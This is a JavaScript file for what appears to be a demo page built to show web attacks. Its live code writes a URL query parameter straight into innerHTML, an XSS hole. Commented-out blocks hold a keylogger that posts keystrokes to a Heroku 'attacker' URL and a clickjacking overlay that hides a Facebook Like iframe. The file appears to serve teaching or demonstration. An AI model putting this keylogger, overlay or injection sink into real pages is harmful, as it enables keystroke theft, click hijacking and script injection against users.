// let buffer = [];

// const attacker = 'https://guarded-cove-92402.herokuapp.com/victiminfo/';

function ready() {
    var query = new URL(window.location).searchParams.get('query');
    document.getElementById('query-input').value = query;
    document.getElementById('query-output').innerHTML = query;
}

// function formatDate(date) {
//     var d = new Date(date),
//         month = '' + (d.getMonth() + 1),
//         day = '' + d.getDate(),
//         year = d.getFullYear(),
//         time = d.getHours() + ':' + d.getMinutes() + ':' + d.getSeconds();

//     if (month.length < 2) month = '0' + month;
//     if (day.length < 2) day = '0' + day;

//     return [ year, month, day, time ].join('-');
// }

// document.onkeydown = function(e) {
//     // var timestamp = Date.now() | 0;
//     var timestamp = formatDate(Date.now());
//     var stroke = {
//         message : e.key
//         // timestamp : timestamp
//     };
//     buffer.push(stroke);
// };

// window.setInterval(function() {
//     if (buffer.length > 0) {
//         buffer.forEach((stroke) => {
//             const xhr = new XMLHttpRequest();
//             const data = JSON.stringify(stroke);
//             xhr.open('POST', 'https://cors-anywhere.herokuapp.com/' + attacker, true);
//             xhr.setRequestHeader('Content-Type', 'application/json');
//             // xhr.send(data);
//             console.log(`${data}`);
//         });
//         buffer = [];
//     }
// }, 200);

const cookieBanner = document.getElementById('cookie-banner');

function fadeOutEffect() {
    console.log('clicked button');
    var fadeEffect = setInterval(function() {
        if (!cookieBanner.style.opacity) {
            cookieBanner.style.opacity = 1;
        }
        if (cookieBanner.style.opacity > 0) {
            cookieBanner.style.opacity -= 0.1;
        } else {
            clearInterval(fadeEffect);
        }
    }, 200);
}

if (localStorage.getItem('cookieSeen') != 'shown') {
    localStorage.setItem('cookieSeen', 'shown');
}

const close = document.getElementsByClassName('consent__button')[0].addEventListener('click', fadeOutEffect);

// console.log('JS has been injected into this page');
// const clickjackDiv = document.createElement('div');
// clickjackDiv.id = 'invisible_button';
// clickjackDiv.style.marginTop = '633px';
// clickjackDiv.style.marginLeft = '723px';
// clickjackDiv.style.position = 'fixed';
// clickjackDiv.style.zIndex = '111';
// clickjackDiv.style.opacity = '0';
// clickjackDiv.innerHTML = `<div data-href='https://developers.facebook.com/docs/plugins/' data-layout='button_count' data-size='large' data-share='false' class='fb-like fb_iframe_widget' fb-xfbml-state='rendered' fb-iframe-plugin-query='app_id=113869198637480&amp;container_width=557&amp;href=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fplugins%2F&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;share=false&amp;size=large'><span style='vertical-align: bottom; width: 100px; height: 28px;'><iframe name='f21b0f16658a5d4' width='1000px' height='1000px' title='fb:like Facebook Social Plugin' frameborder='0' allowtransparency='true' allowfullscreen='true' scrolling='no' allow='encrypted-media' src='https://www.facebook.com/v6.0/plugins/like.php?app_id=113869198637480&amp;channel=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D46%23cb%3Df3946ea43649e24%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ffb469569e6ff48%26relation%3Dparent.parent&amp;container_width=557&amp;href=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fplugins%2F&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;share=false&amp;size=large' style='border: none; visibility: visible; width: 100px; height: 28px;' class=''></iframe></span></div>`;
// document.body.appendChild(clickjackDiv);
